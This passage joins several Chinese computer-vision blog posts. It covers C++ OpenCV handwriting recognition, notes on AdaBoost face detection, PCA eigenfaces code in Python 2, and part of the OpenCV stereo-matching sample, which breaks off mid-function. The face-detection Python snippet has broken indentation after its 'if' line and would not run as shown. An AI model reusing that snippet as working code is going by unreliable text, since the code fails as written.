CvFont mycvFont;

//归一化处理
void toNormalSize()
{
	int max_temp_x=0;
	int max_temp_y=0;
	int min_temp_x=10000;
	int min_temp_y=10000;
	for(int i=0;i<(int)FingerTrackListOpt.size();i++)
	{
		int ListObjSize = (int)FingerTrackListOpt[i].track.size();
		for(int j=0;j<(int)ListObjSize;j++)	
		{				
			//FingerTrackListOpt[i].track[j].center.x -=FingerTrackListOpt[i].track[0].center.x; 
			//FingerTrackListOpt[i].track[j].center.y -=FingerTrackListOpt[i].track[0].center.y;
			max_temp_x = max((FingerTrackListOpt[i].track[j].center.x),max_temp_x);
			max_temp_y = max((FingerTrackListOpt[i].track[j].center.y),max_temp_y);
			min_temp_x = min((FingerTrackListOpt[i].track[j].center.x),min_temp_x);
			min_temp_y = min((FingerTrackListOpt[i].track[j].center.y),min_temp_y);
		}		
	}


	for(int i=0;i<(int)FingerTrackListOpt.size();i++)
	{
		int ListObjSize = (int)FingerTrackListOpt[i].track.size();
		for(int j=0;j<(int)ListObjSize;j++)	
		{				
			FingerTrackListOpt[i].track[j].center.x -=min_temp_x; 
			FingerTrackListOpt[i].track[j].center.y -=min_temp_y;
		}
	}

	int MaxW = max(max_temp_x-min_temp_x,max_temp_y-min_temp_y); //最大的
	for(int i=0;i<(int)FingerTrackListOpt.size();i++)
	{
		int ListObjSize = (int)FingerTrackListOpt[i].track.size();
		for(int j=0;j<(int)ListObjSize;j++)	
		{				
			FingerTrackListOpt[i].track[j].center.x =(int)((float)FingerTrackListOpt[i].track[j].center.x/MaxW*SCALE_MAX); 
			FingerTrackListOpt[i].track[j].center.y =(int)((float)FingerTrackListOpt[i].track[j].center.y/MaxW*SCALE_MAX);   
		}
	}

}


void analysis()
{
	FingerTrackListOpt.clear();
	for(int i=0;i<(int)FingerTrackList.size();i++)
	{
		//创建FingerTrack 加入FingerTrackListOpt
		FingerTrack ft;			
		FingerTrackListOpt.push_back(ft);
		CvPoint start_pt = FingerTrackList[i].track[0].center;		
		Finger fg;
		fg.center  = start_pt;
		FingerTrackListOpt[i].track.push_back(fg);	

		//求取距离总和
		long total_dis =0;
		int ListObjSize = (int)FingerTrackList[i].track.size();
		for(int j=0;j<ListObjSize-1;j++)	
		{
			CvPoint pt = FingerTrackList[i].track[j].center;
			CvPoint pt_next = FingerTrackList[i].track[j+1].center;
			long distance = (pt_next.x - pt.x)*(pt_next.x - pt.x) +  (pt_next.y - pt.y)*(pt_next.y - pt.y);
			total_dis+=(long)sqrt((float)distance);
		}
		int search_len = total_dis/(SAMPLE_COUNT+2); //确定分割长度，取20等份
		assert(search_len>0);

		//插值
		for(int j=0;j<ListObjSize;j++)				
		{				

			CvPoint pt = FingerTrackList[i].track[j].center;
			long distance = (start_pt.x - pt.x)*(start_pt.x - pt.x) +  (start_pt.y - pt.y)*(start_pt.y - pt.y);
			distance = (long)sqrt((float)distance);
			if(distance>search_len)
			{
				//在轨迹上计算一个插值虚拟点
				float radio = (float)search_len/distance;
				start_pt.x = (int)(start_pt.x + (pt.x - start_pt.x)*radio);
				start_pt.y = (int)(start_pt.y + (pt.y - start_pt.y)*radio);
				Finger fg;
				fg.center  = start_pt;
				FingerTrackListOpt[i].track.push_back(fg);	
				j--;
			}				
		}
	}

	//归一化处理
	toNormalSize();



};
//写入特征数据到文件或者数组
void WriteData(float featureData[])
{
	std::fstream logfile("data.txt",std::ios::app);	
	int Tracksize = (int)FingerTrackListOpt.size();
	if(!InRecongnize)
	{
		logfile<<letter<<",";
		logfile<<Tracksize;
	}

	featureData[0] = (float)Tracksize;
	int f_index = 0;

	for(int i=0;i<Tracksize;i++)
	{		
		int ListObjSize = (int)FingerTrackListOpt[i].track.size();
		assert(ListObjSize>=SAMPLE_COUNT);

		float pcadata[SAMPLE_COUNT_OPT];
		int fData[SAMPLE_COUNT];	
		//X DFT
		for(int j=0;j<SAMPLE_COUNT;j++)
		{			
			fData[j] = FingerTrackListOpt[i].track[j].center.x;			
		}
		ml.ExtractDFT(pcadata,fData,SAMPLE_COUNT,SAMPLE_COUNT_OPT);
		for(int k=0;k<SAMPLE_COUNT_OPT;k++)
		{
			if(!InRecongnize) logfile<<","<<pcadata[k];
			f_index++;
			featureData[f_index] = pcadata[k];


		}
		//Y DFT
		for(int j=0;j<SAMPLE_COUNT;j++)
		{			
			fData[j] = FingerTrackListOpt[i].track[j].center.y;			
		}
		ml.ExtractDFT(pcadata,fData,SAMPLE_COUNT,SAMPLE_COUNT_OPT);
		for(int k=0;k<SAMPLE_COUNT_OPT;k++)
		{
			if(!InRecongnize) logfile<<","<<pcadata[k];
			f_index++;
			featureData[f_index] = pcadata[k];
		}


	}
	for(int i=Tracksize;i<3;i++) //用0填充
	{			
		for(int j=0;j<SAMPLE_COUNT_OPT;j++)
		{
			if(!InRecongnize) logfile<<","<<0;
			if(!InRecongnize) logfile<<","<<0;
			f_index++;
			featureData[f_index] =  0.0f; 
			f_index++;
			featureData[f_index] =  0.0f; 
		}
	}
	if(!InRecongnize) logfile<<"\n";
	logfile.close();
}

static void on_mouse( int event, int x, int y, int flags, void *param )
{
	if( event == CV_EVENT_LBUTTONDOWN )
	{
		if(!inTrack)
		{
			FingerTrack ft;			
			FingerTrackList.push_back(ft);
			inTrack = true;

		}

	} 
	else if ( event == CV_EVENT_MOUSEMOVE )
	{
		if(inTrack)
		{
			Finger fg;
			fg.center  = cvPoint(x,y);
			FingerTrackList.back().track.push_back(fg);		
			idle_time =0;
		}
	}
	else if ( event == CV_EVENT_LBUTTONUP ) 
	{
		inTrack = false;
		//analysis();

		start_time = timeGetTime();
		analysis();
		//DFT();

	}

};
void OnChangeData(int pos)
{
	letter = pos+'A';
}

int main(int argc, char* argv[])
{


	std::cout<<"                == The upper letter online handwriting recongnize ==" << std::endl;
	std::cout<<" 1. there two state (recongnizing and traning) for the app,In recongnizing mode,use your mouse write upper letter on 'Win' window,after 1 second,then will get result on Win2" << std::endl;
	std::cout<<" 2. you can press 'm' key to change mode from recongnizing to traning or back." << std::endl;	
	std::cout<<" 3. In traning mode,change the value of letter, then you can write upper letter on 'Win' window, and app will write data into data.txt." << std::endl;
	std::cout<<" 4. you can retrain the traning data by press 't' without restart program." << std::endl;
	std::cout<<" 5. you can modify the traning data 'data.txt' by hand if you want. " << std::endl<< std::endl;
	std::cout<<" enjoy it.:)" << std::endl<< std::endl;
	std::cout<<" ===============================================================" << std::endl;



	CvSize image_sz = cvSize( 1000,1000); 
	image = cvCreateImage(image_sz , 8, 3 );
	image2 = cvCreateImage(image_sz , 8, 3 );

	cvNamedWindow("Win",0);
	cvNamedWindow("Win2",0);
	cvSetMouseCallback( "Win", on_mouse, 0 );
	cvResizeWindow("Win",500,500);
	cvResizeWindow("Win2",500,500);
	cvCreateTrackbar("Letter", "Win2", &traing_data, 25, OnChangeData);

	mycvFont = cvFont(5,2);
	ml.DataCount = 1 + SAMPLE_COUNT_OPT*2*3;
	ml.train("data.txt",0);	


	for(;;)
	{			
		//set Timer		
		idle_time = timeGetTime()-start_time;
		if(idle_time>IDLE_TIME_SPAN && FingerTrackList.size()>0 && !inTrack)
		{

			float featureData[31];
			//记录训练数据
			WriteData(featureData);
			idle_time = 0;
			FingerTrackList.clear();
			FingerTrackListOpt.clear();

			if(InRecongnize)
			{
				pre_letter = 0;
				ml.predict(pre_letter,featureData);

			}

		}

		cvZero(image);
		cvZero(image2);

		for(int i=0;i<(int)FingerTrackList.size();i++)
		{
			for(int j=0;j<(int)FingerTrackList[i].track.size();j++)	
				cvCircle(image,FingerTrackList[i].track[j].center,10,CV_RGB(0,255,0),1,8,0);
		}

		for(int i=0;i<(int)FingerTrackListOpt.size();i++)
		{
			for(int j=0;j<(int)FingerTrackListOpt[i].track.size();j++)	
			{
				CvPoint newpt = FingerTrackListOpt[i].track[j].center;
				newpt.x =newpt.x/2+image2->width/2;
				newpt.y =newpt.y/2+image2->height/2;
				cvLine(image2,cvPoint(image2->width/2,0),cvPoint(image2->width/2 ,image2->height),CV_RGB(255,255,0),2,8,0);
				cvLine(image2,cvPoint(0,image2->height/2),cvPoint(image2->width ,image2->height/2),CV_RGB(255,255,0),2,8,0);				
				cvCircle(image2,newpt,10,CV_RGB(255,0,0),1,8,0);
			}
		}


		CvPoint pt_info;

		if(InRecongnize) 
		{
			pt_info = cvPoint(20,920);
			mycvFont = cvFont(2,2);
			cvPutText(image2,"recongnizing result = ",pt_info,&mycvFont,CV_RGB(20,250,250));
			if(pre_letter!=0)
			{
				mycvFont = cvFont(5,2);
				pt_info = cvPoint(400,920);
				cvPutText(image2,&pre_letter,pt_info,&mycvFont,CV_RGB(255,0,0));
			}
		}
		else
		{
			mycvFont = cvFont(5,2);
			pt_info = cvPoint(290,920);
			cvPutText(image2,&letter,pt_info,&mycvFont,CV_RGB(20,250,250));
			mycvFont = cvFont(2,2);
			pt_info = cvPoint(20,920);
			cvPutText(image2,"is traning...",pt_info,&mycvFont,CV_RGB(20,250,250));			

		}



		cvShowImage("Win",image);
		cvShowImage("Win2",image2);
		int keyCode = cvWaitKey(10);
		if (keyCode==27) break;
		if (keyCode=='c')
		{
			FingerTrackList.clear();
			FingerTrackListOpt.clear();
		}
		if (keyCode=='t')
		{			
			ml.train("data.txt",0);	
		}
		if (keyCode=='m')
		{
			InRecongnize = InRecongnize^1;
		}

	}

	return 0;
}


int DFT()
{
	for(int k=0;k<(int)FingerTrackListOpt.size();k++)
	{

		int ListObjSize = (int)FingerTrackListOpt[k].track.size();
		//if(ListObjSize==20) break;
		printf("\n\nListObjSize %d ",ListObjSize);

		CvMat* s = cvCreateMat(1,ListObjSize,CV_32FC1);
		CvMat* d = cvCreateMat(1,ListObjSize,CV_32FC1);
		CvMat* s2 = cvCreateMat(1,ListObjSize,CV_32FC1);

		long avg_x =0;
		long avg_y =0;
		for(int j=0;j<(int)ListObjSize;j++)	
		{
			CvPoint pt = FingerTrackListOpt[k].track[j].center;
			avg_x +=pt.x;
			avg_y +=pt.y;
		}
		avg_x = avg_x/ListObjSize;
		avg_y = avg_y/ListObjSize;

		for(int j=0;j<(int)ListObjSize;j++)	
		{
			CvPoint pt = FingerTrackListOpt[k].track[j].center;
			float dis =(float)((pt.x-avg_x)* (pt.x-avg_x) +  (pt.y-avg_y)* (pt.y-avg_y));
			dis = sqrt(dis);
			cvSetReal2D(s,0,j,dis);
		}
		//for(int j=0;j<(int)ListObjSize;j++)	
		//{
		//	printf("%6.2f ",cvGetReal2D(s,0,j));
		//}

		printf(" \n");

		//DFT 离散傅立叶变换
		cvDFT(s,d,CV_DXT_FORWARD);     //CV_DXT_FORWARD 代表了正变换：空域－〉频域

		printf("\n The result of DFT: ");
		for(int j=0;j<(int)ListObjSize;j++)	
			printf("%6.2f ",cvGetReal2D(d,0,j));

		//printf(" \n");
		////DFT 离散傅立叶逆变换
		//cvDFT(d,s2,CV_DXT_INV_SCALE); //逆变换
		//printf("\n The result of IDFT: ");
		//for(int j=0;j<(int)ListObjSize;j++)	
		//	printf("%6.2f ",cvGetReal2D(s2,0,j));
		//printf(" ");

		cvReleaseMat(&s);
		cvReleaseMat(&d);
		cvReleaseMat(&s2);
	}
	return 0;
}

 
 
实现效果：
 










首先给大家推荐一本书：机器学习算法原理与编程实践 
 
本文内容全部转载于书中，相当于一个读书笔记了吧
绪论
1992年麻省理工学院通过实验对比了基于结构特征的方法与基于模版匹配的方法，发现模版匹配的方法要优于基于特征的方法。
以支持向量机为代表的统计学习理论在随后被应用到了人脸识别与确认中去。但是由于算法运行效率问题，很快被一种新的算法替代了。这就是2001年康柏研究院提出的基于简单矩形特征和AdaBoost的实时人脸检测系统。该方法的主要贡献包括： 
1.可以快速计算简单矩形特征作为人脸图像特征 
2.基于AdaBoost将大量弱分类器进行组合形成强分类器的学习方法。 
3.采用了级联（Cascade）技术提高检测速度。目前，基于这种人脸/非人脸学习的策略已经能够实现准实时的多姿态人脸检测与跟踪，这为后端的人脸识别提供了良好的基础。
人脸检测
人脸检测主要用于人脸识别的预处理，即在图像中标注出人脸所处的位置和大小。为了能够确定图片中包含一张或几张人脸，首先要确定人脸的通用结构。我们都有：眼镜、鼻子，前额，颧骨和嘴，所有这些构成了一张通用的人脸结构。下图的特征组件分别标识了上述结构。 
 
组合这些特征就可以得到一张近似的人脸： 

人脸检测的主流方法是AdaBoost，它是一种用来分类的方法，通过把一些比较弱的分类方法合在一起，可以组合出新的更强的分类器。AdaBoost有一个迭代的过程，为了快速处理，在每次迭代中，我们仅仅快速地排除图片中不属于人脸的区域，保留那些我们还不确定的区域。在每次迭代中，我们都提高了对图片中人脸定位的概率，直到做出最终的决定。换句话说，不同于确定图片中人脸的位置，我们选择的排除图片中不包含人脸位置，因为排除算法的运算速度更快。我们称这个过程为级联过程。 
OpenCV中常用的特征分类器有两类：Haar特征和LBP特征 
 
 在OpenCV中使用Haar特征检测人脸，那么需要使用OpenCV提供的xml文件（级联表）在sources\data目录下。这张级联表有一个训练好的AdaBoost训练集。首先要采用样本的Haar特征训练分类器，从而得到一个级联的AdaBoost分类器。训练的方式包含两个方面： 
 1.正例样本，即待检测的目标样本 
 2.反例样本，即其他任意的图片 
 然后将这些图片统一缩放为相同的尺寸，这个过程就是归一化。最后统计出分类结果。
实现效果： 
 
代码：
# -*- coding: utf-8 -*-
"""
Created on Wed Jun 22 20:59:21 2016

@author: Administrator
"""

# -*- coding: utf-8 -*

import numpy as np
import cv2
#要使用Haar cascade实现，仅需要把库修改为lbpcascade_frontalface.xml
face_cascade = cv2.CascadeClassifier('lbpcascade_frontalface.xml')

img = cv2.imread('woman.jpg')
gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
# 识别输入图片中的人脸对象.返回对象的矩形尺寸
# 函数原型detectMultiScale(gray, 1.2,3,CV_HAAR_SCALE_IMAGE,Size(30, 30))
# gray需要识别的图片
# 1.03：表示每次图像尺寸减小的比例
# 5：表示每一个目标至少要被检测到4次才算是真的目标(因为周围的像素和不同的窗口大小都可以检测到人脸)
# CV_HAAR_SCALE_IMAGE表示不是缩放分类器来检测，而是缩放图像，Size(30, 30)为目标的最小最大尺寸
# faces：表示检测到的人脸目标序列
faces = face_cascade.detectMultiScale(gray, 1.03, 5)
for (x,y,w,h) in faces:
    if w+h>200:#//针对这个图片画出最大的外框
    img2 = cv2.rectangle(img,(x,y),(x+w,y+h),(255,255,255),4)
    roi_gray = gray[y:y+h, x:x+w]
    roi_color = img[y:y+h, x:x+w]

cv2.imshow('img',img)
cv2.waitKey(0)
cv2.destroyAllWindows()
cv2.imwrite("head.jpg", img) # 保存图片
AdaBoost算法概述
Haar级联检测和LBP检测都是使用AdaBoost算法实现的。AdaBoost算法是Adaptive Boosting算法的缩写，是Boosting算法的改进版本。AdaBoost与其前身Boost算法都是从决策树发展出来的一种算法，其算法思想是针对同一个训练集样本的不同特征，分别训练出不同的弱分类器，然后把这些弱分类器级联起来，构成一个最终分类器，即强分类器。 
从结构上讲，AdaBoost与其他的机器学习算法不同，该算法可以分为两层，第一层是AdaBoost主算法，第二层是其他的二分类算法，所以该算法是一种复合型算法。第二层最常用的是单层决策树。当然也可以是其他任何二分类算法。例如梯度下降算法、SVM等。
人脸识别
目前最常用的自动人脸识别技术仍旧是特征脸提取方法。特征脸方法是从整体上对人脸识别的方法：一种面部图像可以表示为从高维图像空间映射到地位空间的一个点。这样可以使得分类边的更加容易。
降维
一幅图像只能表示为一个对象，对于w x h的灰度图像，只能表示为w*h维的向量，那么100*100像素大小的图像就需要10000维的向量空间。对于一副人脸图像，显然在维数空间中只有少量像素对我们有用。所以可以降维，矩阵可以近似的表示为一个特征值和特征向量的乘积，如果我们能够提取出高维向量中某些特有的特征或者相关变量，就能用一个低维空间的向量近似地表示这个高维向量。对于这个高维向量，只有高喊最多信息的那些维上的数据才有意义，不重要的维可以在计算中忽略，并且降维之后的低维向量不会损失掉特征间的差异性。这就是主成份分析的思想（PCA），1901年就由皮尔逊发布了基本原理： 

PCA人脸识别算法
PCA人脸识别算法的实现步骤如下： 
1.首先把所有的训练图片集的每张图片都转换为行向量的形式 
2.计算向量集的PCA子空间，并得到特征值和特征向量及均值 
3.将训练集的图片与对应的标签都投影到这个PCA子空间，行程一个投影矩阵 
4.导入待识别的图像，并进行向量化，也投影到这个PCA子空间 
5.计算PCA投影后的训练集向量与待识别图片投影后向量的距离，并找出最接近的那个
# -*- coding: utf-8 -*-
from numpy import *
import numpy as np
import sys,os
import copy
import cv2
import PIL.Image as Image
import matplotlib.pyplot as plt  

class Eigenfaces(object):
    def __init__(self):
        self.eps = 1.0e-16
        self.X = []
        self.y = []
        self.Mat=[]
        self.eig_v = 0
        self.eig_vect = 0
        self.mu = 0
        self.projections = []
        self.dist_metric=0
    def loadimgs(self,path): # 加载图片数据集
        classlabel = 0
        for dirname, dirnames, filenames in os.walk(path):
            for subdirname in dirnames:
                sub_path = os.path.join(dirname, subdirname)
                for filename in os.listdir(sub_path):
                    im = Image.open(os.path.join(sub_path, filename))
                    im = im.convert("L") #数据转换为long类型
                    self.X.append(np.asarray(im, dtype=np.uint8))
                    self.y.append(classlabel)
                classlabel += 1 
    # 将图片变为行向量  # 生成图片矩阵
    def genRowMatrix(self):
        self.Mat = np.empty((0, self.X[0].size), dtype=self.X[0].dtype)
        for row in self.X:
            self.Mat = np.vstack((self.Mat, np.asarray(row).reshape(1,-1)))
    # 计算特征脸
    def PCA(self, pc_num =0):
        self.genRowMatrix() 
        [n,d] = shape(self.Mat)
        if ( pc_num <= 0) or ( pc_num>n):       pc_num = n
        self.mu = self.Mat.mean(axis =0)
        self.Mat -= self.mu
        if n>d:
            XTX = np.dot (self.Mat.T,self.Mat)
            [ self.eig_v , self.eig_vect ] = linalg.eigh (XTX)
        else :
            XTX = np.dot(self.Mat,self.Mat.T)
            [ self.eig_v , self.eig_vect ] = linalg.eigh (XTX)
        self.eig_vect = np.dot(self.Mat.T, self.eig_vect)
        for i in xrange(n):
            self.eig_vect[:,i] = self.eig_vect[:,i]/linalg.norm(self.eig_vect[:,i])
        idx = np.argsort(-self.eig_v)
        self.eig_v = self.eig_v[idx]
        self.eig_vect = self.eig_vect[:,idx ]       
        self.eig_v = self.eig_v[0:pc_num ].copy () # select only pc_num
        self.eig_vect = self.eig_vect[:,0:pc_num].copy ()

    def compute(self):
        self.PCA()
        for xi in self.X:
            self.projections.append(self.project(xi.reshape(1,-1))) 

    def distEclud(self, vecA, vecB):  # 欧氏距离
        return linalg.norm(vecA-vecB)+self.eps 

    def cosSim(self, vecA, vecB):    # 夹角余弦 
        return (dot(vecA,vecB.T)/((linalg.norm(vecA)*linalg.norm(vecB))+self.eps))[0,0]
    # 映射
    def project(self,XI):
        if self.mu is None: return np.dot(XI,self.eig_vect)
        return np.dot(XI-self.mu, self.eig_vect)    
    #预测最接近的特征脸
    def predict(self,XI):
        minDist = np.finfo('float').max
        minClass = -1
        Q = self.project(XI.reshape(1,-1))
        for i in xrange(len(self.projections)):
            dist = self.dist_metric(self.projections[i], Q)
            if dist < minDist:
                minDist = dist
                minClass = self.y[i]
        return minClass
    # 生成特征脸
    def subplot(self,title, images):
        fig = plt.figure()
        fig.text(.5, .95, title, horizontalalignment='center') 
        for i in xrange(len(images)):
            ax0 = fig.add_subplot(4,4,(i+1))
            plt.imshow(asarray(images[i]), cmap="gray")
            plt.xticks([]), plt. yticks([]) # 隐藏 X Y 坐标
        plt.show()
    # 归一化
    def normalize(self, X, low, high, dtype=None):
        X = np.asarray(X)
        minX, maxX = np.min(X), np.max(X)
        X = X - float(minX)
        X = X / float((maxX - minX))
        X = X * (high-low)
        X = X + low
        if dtype is None:
            return np.asarray(X)
        return np.asarray(X, dtype=dtype)
'''     
    # 重构
    def reconstruct(self,W, Y, mu=None):
        if mu is None:  return np.dot(Y,W.T)
        return np.dot(Y, W.T) + mu
    # 从外部数据计算投影
    def out_project(self,W,XI,mu):
        if mu is None:  return np.dot(XI,W)
        return np.dot(XI-mu, W) 
'''
生成特征脸：
 
代码：
# -*- coding: utf-8 -*-

from numpy import *
import sys,os
from pca import *

reload(sys)
sys.setdefaultencoding('utf-8')

ef = Eigenfaces() 
ef.dist_metric=ef.distEclud
ef.loadimgs("orl_faces/")
ef.compute()
E = []
X = mat(zeros((10,10304)))
for i in xrange(16):
    X = ef.Mat[i*10:(i+1)*10,:].copy()
    # X = ef.normalize(X.mean(axis =0),0,255)
    X = X.mean(axis =0)
    imgs = X.reshape(112,92)
    E.append(imgs)
ef.subplot(title="AT&T Eigen Facedatabase", images=E)  
执行人脸识别：
from numpy import *
import sys,os
from pca import *

reload(sys)
sys.setdefaultencoding('utf-8')

ef = Eigenfaces() 
ef.dist_metric=ef.distEclud
ef.loadimgs("orl_faces/")
ef.compute()
# 创建测试集
testImg = ef.X[30]
print "实际值 =", ef.y[30], "->", "预测值 =",ef.predict(testImg)
待续。。。
代码下载：
http://download.csdn.net/detail/wangyaninglm/9555895
参考文献
机器学习算法原理与编程实践 








 

一直找不到opencv stereo matching的根据和原理出处，下面这个文章贴了个链接，有时间看看：

 

 

Basically OpenCV
 provides 2 methods to calculate a dense disparity map:


cvFindStereoCorrespondenceBM: Fast (can
 process several images per second), but if parameters not tuned then the results are poor.
cvFindStereoCorrespondenceGC: Really
 Slow (takes several seconds, even minutes per image), but gets very
 accurate results.

In this post I willfocus on cvFindStereoCorrespondenceBM, this method is based on Konolige's
 Block Matching Algorithm. 

 

参考：
http://blog.martinperis.com/2011/08/opencv-stereo-matching.html








转载请注明出处：http://blog.csdn.net/wangyaninglm/article/details/44151213，

来自：shiter编写程序的艺术


基础知识
计算机视觉是一门研究使用计算机来模拟人的视觉系统的学科。“一图胜千言”，人类对于图像中的信息感知效率远超文字等其他媒介，人类获取的信息总量中更是有高达80%依靠视觉系统[1]。相对于人类高效的图像信息提取能力，计算机在图像信息的理解上仍然效率低下。 计算机视觉作为一门交叉学科，综合了生物学，心理学，数学，计算机科学等学科，从20世纪60年代至今其在科学研究领域中的大量成果已经应用于工程领域，并影响了我们每个人生活的方方面面。 双目立体视觉是计算机视觉领域的重要分支，它通过模拟人的视觉系统来处理现实世界。以机器人，无人汽车导航为例，由于双目立体匹配在非接触测量中的优秀性能，视觉测量在探月工程，火星探测工程中起到了重要作用[2]，如图所示的我国嫦娥探月工程的巡航车就配备了立体视觉导航系统，来进行行进间的运动控制和路径规划[3]。 
主要参考：http://blog.csdn.net/wangyaninglm/article/details/51533549
 
 之前在网上也没有现成的代码，现在把库中的sample拿出来，分享下
/*
 *  stereo_match.cpp
 *  calibration
 *
 *  Created by Victor  Eruhimov on 1/18/10.
 *  Copyright 2010 Argus Corp. All rights reserved.
 *
 */

#include "opencv2/calib3d/calib3d.hpp"
#include "opencv2/imgproc/imgproc.hpp"
#include "opencv2/highgui/highgui.hpp"
#include "opencv2/contrib/contrib.hpp"

#include <stdio.h>

using namespace cv;

static void print_help()
{
    printf("\nDemo stereo matching converting L and R images into disparity and point clouds\n");
    printf("\nUsage: stereo_match <left_image> <right_image> [--algorithm=bm|sgbm|hh|var] [--blocksize=<block_size>]\n"
           "[--max-disparity=<max_disparity>] [--scale=scale_factor>] [-i <intrinsic_filename>] [-e <extrinsic_filename>]\n"
           "[--no-display] [-o <disparity_image>] [-p <point_cloud_file>]\n");
}

static void saveXYZ(const char* filename, const Mat& mat)
{
    const double max_z = 1.0e4;
    FILE* fp = fopen(filename, "wt");
    for(int y = 0; y < mat.rows; y++)
    {
        for(int x = 0; x < mat.cols; x++)
        {
            Vec3f point = mat.at<Vec3f>(y, x);
            if(fabs(point[2] - max_z) < FLT_EPSILON || fabs(point[2]) > max_z) continue;
            fprintf(fp, "%f %f %f\n", point[0], point[1], point[2]);
        }
    }
    fclose(fp);
}

int main(int argc, char** argv)
{
    const char* algorithm_opt = "--algorithm=";
    const char* maxdisp_opt = "--max-disparity=";
    const char* blocksize_opt = "--blocksize=";
    const char* nodisplay_opt = "--no-display";
    const char* scale_opt = "--scale=";

    if(argc < 3)
    {
        print_help();
        return 0;
    }
    const char* img1_filename = 0;
    const char* img2_filename = 0;
    const char* intrinsic_filename = 0;
    const char* extrinsic_filename = 0;
    const char* disparity_filename = 0;
    const char* point_cloud_filename = 0;

    enum { STEREO_BM=0, STEREO_SGBM=1, STEREO_HH=2, STEREO_VAR=3 };
    int alg = STEREO_SGBM;
    int SADWindowSize = 0, numberOfDisparities = 0;
    bool no_display = false;
    float scale = 1.f;

    StereoBM bm;
    StereoSGBM sgbm;
    StereoVar var;

    for( int i = 1; i < argc; i++ )
    {
        if( argv[i][0] != '-' )
        {
            if( !img1_filename )
                img1_filename = argv[i];
            else
                img2_filename = argv[i];
        }
        else if( strncmp(argv[i], algorithm_opt, strlen(algorithm_opt)) == 0 )
        {
            char* _alg = argv[i] + strlen(algorithm_opt);
            alg = strcmp(_alg, "bm") == 0 ? STEREO_BM :
                  strcmp(_alg, "sgbm") == 0 ? STEREO_SGBM :
                  strcmp(_alg, "hh") == 0 ? STEREO_HH :
                  strcmp(_alg, "var") == 0 ? STEREO_VAR : -1;
            if( alg < 0 )
            {
                printf("Command-line parameter error: Unknown stereo algorithm\n\n");
                print_help();
                return -1;
            }
        }
        else if( strncmp(argv[i], maxdisp_opt, strlen(maxdisp_opt)) == 0 )
        {
            if( sscanf( argv[i] + strlen(maxdisp_opt), "%d", &numberOfDisparities ) != 1 ||
                numberOfDisparities < 1 || numberOfDisparities % 16 != 0 )
            {
                printf("Command-line parameter error: The max disparity (--maxdisparity=<...>) must be a positive integer divisible by 16\n");
                print_help();
                return -1;
            }
        }
        else if( strncmp(argv[i], blocksize_opt, strlen(blocksize_opt)) == 0 )
        {
            if( sscanf( argv[i] + strlen(blocksize_opt), "%d", &SADWindowSize ) != 1 ||
                SADWindowSize < 1 || SADWindowSize % 2 != 1 )
            {
                printf("Command-line parameter error: The block size (--blocksize=<...>) must be a positive odd number\n");
                return -1;
            }
        }
        else if( strncmp(argv[i], scale_opt, strlen(scale_opt)) == 0 )
        {
            if( sscanf( argv[i] + strlen(scale_opt), "%f", &scale ) != 1 || scale < 0 )
            {
                printf("Command-line parameter error: The scale factor (--scale=<...>) must be a positive floating-point number\n");
                return -1;
            }
        }
        else if( strcmp(argv[i], nodisplay_opt) == 0 )
            no_display = true;
        else if( strcmp(argv[i], "-i" ) == 0 )
            intrinsic_filename = argv[++i];
        else if( strcmp(argv[i], "-e" ) == 0 )
            extrinsic_filename = argv[++i];
        else if( strcmp(argv[i], "-o" ) == 0 )
            disparity_filename = argv[++i];
        else if( strcmp(argv[i], "-p" ) == 0 )
            point_cloud_filename = argv[++i];
        else
        {
            printf("Command-line parameter error: unknown option %s\n", argv[i]);
            return -1;
        }
    }

    if( !img1_filename || !img2_filename )
    {
        printf("Command-line parameter error: both left and right images must be specified\n");
        return -1;
    }

    if( (intrinsic_filename != 0) ^ (extrinsic_filename != 0) )
    {
        printf("Command-line parameter error: either both intrinsic and extrinsic parameters must be specified, or none of them (when the stereo pair is already rectified)\n");
        return -1;
    }

    if( extrinsic_filename == 0 && point_cloud_filename )
    {
        printf("Command-line parameter error: extrinsic and intrinsic parameters must be specified to compute the point cloud\n");
        return -1;
    }

    int color_mode = alg == STEREO_BM ? 0 : -1;
    Mat img1 = imread(img1_filename, color_mode);
    Mat img2 = imread(img2_filename, color_mode);

    if( scale != 1.f )
    {
        Mat temp1, temp2;
        int method = scale < 1 ? INTER_AREA : INTER_CUBIC;
        resize(img1, temp1, Size(), scale, scale, method);
        img1 = temp1;
        resize(img2, temp2, Size(), scale, scale, method);
        img2 = temp2;
    }

    Size img_size = img1.size();

    Rect roi1, roi2;
    Mat Q;

    if( intrinsic_filename )
    {
        // reading intrinsic parameters
        FileStorage fs(intrinsic_filename, CV_STORAGE_READ);
        if(!fs.isOpened())
        {
            printf("Failed to open file %s\n", intrinsic_filename);
            return -1;
        }

        Mat M1, D1, M2, D2;
        fs["M1"] >> M1;
        fs["D1"] >> D1;
        fs["M2"] >> M2;
        fs["D2"] >> D2;

        M1 *= scale;
        M2 *= scale;

        fs.open(extrinsic_filename, CV_STORAGE_READ);
        if(!fs.isOpened())
        {
            printf("Failed to open file %s\n", extrinsic_filename);
            return -1;
        }

        Mat R, T, R1, P1, R2, P2;
        fs["R"] >> R;
        fs["T"] >> T;

        stereoRectify( M1, D1, M2, D2, img_size, R, T, R1, R2, P1, P2, Q, CALIB_ZERO_DISPARITY, -1, img_size, &roi1, &roi2 );

        Mat map11, map12, map21, map22;
        initUndistortRectifyMap(M1, D1, R1, P1, img_size, CV_16SC2, map11, map12);
        initUndistortRectifyMap(M2, D2, R2, P2, img_size, CV_16SC2, map21, map22);

        Mat img1r, img2r;
        remap(img1, img1r, map11, map12, INTER_LINEAR);
        remap(img2, img2r, map21, map22, INTER_LINEAR);

        img1 = img1r;
        img2 = img2r;
    }

    numberOfDisparities = numberOfDisparities > 0 ? numberOfDisparities : ((img_size.width/8) + 15) & -16;

    bm.state->roi1 = roi1;
    bm.state->roi2 = roi2;
    bm.state->preFilterCap = 31;
    bm.state->SADWindowSize = SADWindowSize > 0 ? SADWindowSize : 9;
    bm.state->minDisparity = 0;
    bm.state->numberOfDisparities = numberOfDisparities;
    bm.state->textureThreshold = 10;
    bm.state->uniquenessRatio = 15;
    bm.state->speckleWindowSize = 100;
    bm.state->speckleRange = 32;
    bm.state->disp12MaxDiff = 1;

    sgbm.preFilterCap = 63;
    sgbm.SADWindowSize = SADWindowSize > 0 ? SADWindowSize : 3;

    int cn = img1.channels();

    sgbm.P1 = 8*cn*sgbm.SADWindowSize*sgbm.SADWindowSize;
    sgbm.P2 = 32*cn*sgbm.SADWindowSize*sgbm.SADWindowSize;
    sgbm.minDisparity = 0;
    sgbm.numberOfDisparities = numberOfDisparities;
